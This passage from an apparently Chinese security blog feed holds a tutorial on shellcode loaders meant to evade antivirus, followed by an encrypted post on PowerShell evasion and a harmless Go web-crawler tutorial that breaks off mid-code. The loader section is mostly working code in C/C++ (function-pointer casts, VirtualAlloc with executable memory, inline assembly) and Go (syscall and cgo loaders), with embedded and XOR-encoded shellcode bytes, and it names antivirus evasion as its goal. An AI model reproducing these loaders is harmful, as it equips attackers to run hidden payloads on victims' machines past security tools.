class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><h3 id="C-加载器"><a href="#C-加载器" class="headerlink" title="C++加载器"></a>C++加载器</h3><p>对于C/C++来说，常用的加载方式有<strong>函数指针执行、内联汇编指令、伪指令等方式</strong>.</p><h4 id="函数指针执行"><a href="#函数指针执行" class="headerlink" title="函数指针执行"></a>函数指针执行</h4><p>简单的C代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">  (*(<span class="keyword">void</span>(*)() shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>(void(*)() shellcode</strong> 将shellcode转换为函数指针，指向void形式的函数，然后再通过一个*对指针进行取值，之后通过()双括号调用函数进而执行shell从而执行shellocde。</p><h4 id="动态内存加载"><a href="#动态内存加载" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/subsystem:\"Windows\" /entry:\"mainCRTStartup\""</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">"shellcode"</span>;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *Memory; </span><br><span class="line"></span><br><span class="line"> Memory=VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"> ((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理和上面python实现类似。</p><h4 id="内联汇编指令"><a href="#内联汇编指令" class="headerlink" title="内联汇编指令"></a>内联汇编指令</h4><p>汇编指令相关的知识可以看这里:</p><p><a href="https://www.cxyzjd.com/article/Hkenter/2855771" target="_blank" rel="noopener">免杀、汇编指令大全_K的专栏-程序员宅基地 - 程序员宅基地 (cxyzjd.com)</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">//#pragma comment(linker,"/subsystem:<span class="symbol">\"</span>windows<span class="symbol">\"</span> /entry:<span class="symbol">\"</span>mainCRTStartup<span class="symbol">\"</span>")  // 隐藏控制台窗口显示</span><br><span class="line">#pragma comment(linker,"/INCREMENTAL:NO")                                     // 减小编译体积</span><br><span class="line">#pragma comment(linker, "/section:.data,RWE")                                 // 启用数据段可读写</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] =</span><br><span class="line">"<span class="symbol">\x</span>d9<span class="symbol">\x</span>c5<span class="symbol">\x</span>d9<span class="symbol">\x</span>74<span class="symbol">\x</span>24<span class="symbol">\x</span>f4<span class="symbol">\x</span>ba<span class="symbol">\x</span>8b<span class="symbol">\x</span>fc<span class="symbol">\x</span>02<span class="symbol">\x</span>dd<span class="symbol">\x</span>5e<span class="symbol">\x</span>2b<span class="symbol">\x</span>c9<span class="symbol">\x</span>b1"</span><br><span class="line">"<span class="symbol">\x</span>56<span class="symbol">\x</span>83<span class="symbol">\x</span>ee<span class="symbol">\x</span>fc<span class="symbol">\x</span>31<span class="symbol">\x</span>56<span class="symbol">\x</span>14<span class="symbol">\x</span>03<span class="symbol">\x</span>56<span class="symbol">\x</span>9f<span class="symbol">\x</span>1e<span class="symbol">\x</span>f7<span class="symbol">\x</span>21<span class="symbol">\x</span>77<span class="symbol">\x</span>5c"</span><br><span class="line">"<span class="symbol">\x</span>f8<span class="symbol">\x</span>d9<span class="symbol">\x</span>87<span class="symbol">\x</span>01<span class="symbol">\x</span>70<span class="symbol">\x</span>3c<span class="symbol">\x</span>b6<span class="symbol">\x</span>01<span class="symbol">\x</span>e6<span class="symbol">\x</span>34<span class="symbol">\x</span>e8<span class="symbol">\x</span>b1<span class="symbol">\x</span>6c<span class="symbol">\x</span>18<span class="symbol">\x</span>04"</span><br><span class="line">"<span class="symbol">\x</span>39<span class="symbol">\x</span>20<span class="symbol">\x</span>89<span class="symbol">\x</span>9f<span class="symbol">\x</span>4f<span class="symbol">\x</span>ed<span class="symbol">\x</span>be<span class="symbol">\x</span>28<span class="symbol">\x</span>e5<span class="symbol">\x</span>cb<span class="symbol">\x</span>f1<span class="symbol">\x</span>a9<span class="symbol">\x</span>56<span class="symbol">\x</span>2f<span class="symbol">\x</span>93"</span><br><span class="line">"<span class="symbol">\x</span>ca<span class="symbol">\x</span>ec<span class="symbol">\x</span>3f<span class="symbol">\x</span>cd<span class="symbol">\x</span>34<span class="symbol">\x</span>a2<span class="symbol">\x</span>40<span class="symbol">\x</span>c4";</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  mov eax, offset shellcode;</span><br><span class="line">  JMP EAX</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的写法:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">void</span> RunShellCode()  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="attribute">__asm</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attribute">lea</span> eax, shellcode;  </span><br><span class="line">        <span class="attribute">jmp</span> eax;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MOV EAX, offset shellcode</strong><br>此指令意为将 shellcode 放入到寄存器 EAX 中</p><p><strong>JMP EAX</strong><br>无条件跳转到EAX</p><h4 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h4><p>​    伪指令(Pseudo Instruction)是用于对汇编过程进行控制的指令，该类指令并不是可执行指令，没有机器代码，只用于汇编过程中为汇编程序提供汇编信息。 例如，提供如下信息：哪些是指令、哪些是数据及数据的字长、程序的起始地址和结束地址等。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">void</span> RunShellCode_5()  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="attribute">__asm</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attribute">mov</span> eax, offset shellcode;  </span><br><span class="line">        <span class="attribute">_emit</span> 0xFF;  </span><br><span class="line">        <span class="attribute">_emit</span> 0xE0;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="go加载器"><a href="#go加载器" class="headerlink" title="go加载器"></a>go加载器</h3><h4 id="动态内存加载-1"><a href="#动态内存加载-1" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><p>核心代码如下:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"syscall"</span></span><br><span class="line"><span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">"ntdll.dll"</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">"RtlCopyMemory"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">xor_shellcode := []byte&#123;<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>...&#125;</span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="built_in">uint</span>ptr(len(xor_shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != nil &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="built_in">uint</span>ptr)(unsafe.Pointer(&amp;xor_shellcode[<span class="number">0</span>])), <span class="built_in">uint</span>ptr(len(xor_shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != nil &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实原理与上面python或者C/C++类似。</p><p>通过声明匿名函数,然后指向读入的ShellCode字节数据的那片内存，并将内存设置为可读可写可执行，之后调用函数就将ShellCode运行起来了。</p><h4 id="内联C加载"><a href="#内联C加载" class="headerlink" title="内联C加载"></a>内联C加载</h4><p>核心代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"C"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    buf := <span class="string">""</span></span><br><span class="line">    buf += <span class="string">"xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c"</span></span><br><span class="line">    ...省略...</span><br><span class="line">    buf += <span class="string">"xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2"</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="keyword">byte</span>(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    shellcode既然是一段二进制代码，那加载器的功能其实就是想办法将二进制写到内存中，并将这段内存设置为可执行。在这个过程中，为了逃避杀软，所以要更多采用加密混淆等操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;​        这段时间测试了不少免杀的手法，但是对一些加载器的实现原理还没有完全理清，所以本文主要是学习总结原理和姿势，不测试实际免杀效
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>免杀学习--powershell加载shellcode免杀</title>
    <link href="https://shu1l.github.io/2021/08/06/mian-sha-xue-xi-powershell-jia-zai-shellcode-mian-sha/"/>
    <id>https://shu1l.github.io/2021/08/06/mian-sha-xue-xi-powershell-jia-zai-shellcode-mian-sha/</id>
    <published>2021-08-06T06:00:40.000Z</published>
    <updated>2021-08-20T04:50:22.470Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1e9a2f9c0bc9e823bc85fa7e3e37e1fa9e626f619039fee35f87172f1a400ae9"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
      <category term="免杀" scheme="https://shu1l.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>golang学习--编写爬虫</title>
    <link href="https://shu1l.github.io/2021/04/03/golang-xue-xi-bian-xie-pa-chong/"/>
    <id>https://shu1l.github.io/2021/04/03/golang-xue-xi-bian-xie-pa-chong/</id>
    <published>2021-04-03T08:20:13.000Z</published>
    <updated>2021-08-20T04:42:54.467Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    学习了一段时间的go，觉得自己应该实际上手写一些东西，之前一直使用在三只师傅python写的jsfinder,就想着用go写一个类似jsfinder的爬虫。</p><h4 id="steps1"><a href="#steps1" class="headerlink" title="steps1"></a>steps1</h4><p>首先实现简单访问并读取页面内容的功能，主要使用net/http模块。</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">func main()&#123;</span><br><span class="line"><span class="attribute">resp,err</span>:=http<span class="variable">.Get</span>("https://www<span class="variable">.lenovo</span><span class="variable">.com</span><span class="variable">.cn</span>")</span><br><span class="line">if err!=nil&#123;</span><br><span class="line">log<span class="variable">.Fatal</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">if resp<span class="variable">.StatusCode</span>!=200 &#123;</span><br><span class="line">log<span class="variable">.Fatal</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">doc,err:=ioutil<span class="variable">.ReadAll</span>(resp<span class="variable">.Body</span>)</span><br><span class="line">resp<span class="variable">.Body</span><span class="variable">.Close</span>()</span><br><span class="line">fmt<span class="variable">.Printf</span>("%s",doc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ioutil.ReadAll</strong> 是一个常用的数据读取方法，经常用来读取http请求的response数据，或者读取文件数据。</p><p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210323110459.png" alt></p><p>可以看到正常输出了页面内容。</p><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>​        第二步我们需要对页面进行解析，并提取页面中的js链接。我们可以使用go自带的regexp来进行正则匹配(类似python),这里我使用很方便的第三方包goquery读取HTML代码。</p><p>​    goquery是一个使用go语言写成的HTML解析库，可以让你像jQuery那样的方式来操作DOM文档，使用起来非常的简便。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/PuerkitoBio/goquery"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">resp,err:=http.Get(<span class="string">"https://www.lenovo.com.cn"</span>)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode!=<span class="number">200</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">doc,err:=goquery.NewDocumentFromReader(resp.Body) </span><br><span class="line"><span class="comment">// NewDocumentFromReader：读取字符串的HTML代码</span></span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find函数是查找HTML里面所有符合要求的标签。</span></span><br><span class="line">doc.Find(<span class="string">"a"</span>).Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, s *goquery.Selection)</span></span> &#123;</span><br><span class="line">href, ex := s.Attr(<span class="string">"href"</span>)</span><br><span class="line"><span class="comment">// 使用Attr获取数据所在HTML代码的href属性</span></span><br><span class="line"><span class="keyword">if</span> ex &#123;</span><br><span class="line">fmt.Println(href)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210323112554.png" alt></p><p>可以看到这里成功爬取到了页面的js链接。</p><p>当然这里还有一个更好用的第三方包：<strong>github.com/jackdanger/collectlinks</strong> 可以提取网页中所有的链接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">resp, err := http.Get(<span class="string">"https://www.lenovo.com.cn"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">fmt.Println(link)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用下来感觉要比自己写规则爬的全很多。</p><p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210327163740.png" alt></p><h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>​    第三步我们要对获取到的链接进行处理，首先转化为绝对链接，然后提取出其中的子域名经过去重之后存入新的数组队列中。</p><p>我们这里封装三个函数，分别用来转化绝对路径、判断子域名和去重:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">urlparse</span><span class="params">(href, base <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">uri, err := url.Parse(href)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">" "</span></span><br><span class="line">&#125;</span><br><span class="line">baseUrl, err := url.Parse(base)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">" "</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> baseUrl.ResolveReference(uri).String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>issubdomain</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> reg&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>remove</strong></p><p>去重这里参考了网上数组切片去重的方式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">result = <span class="built_in">append</span>(result, item)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    然后在主函数中再定义一个sublists数组，然后对收集到的js链接调用上述函数进行处理后，将结果保存到数组中输出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 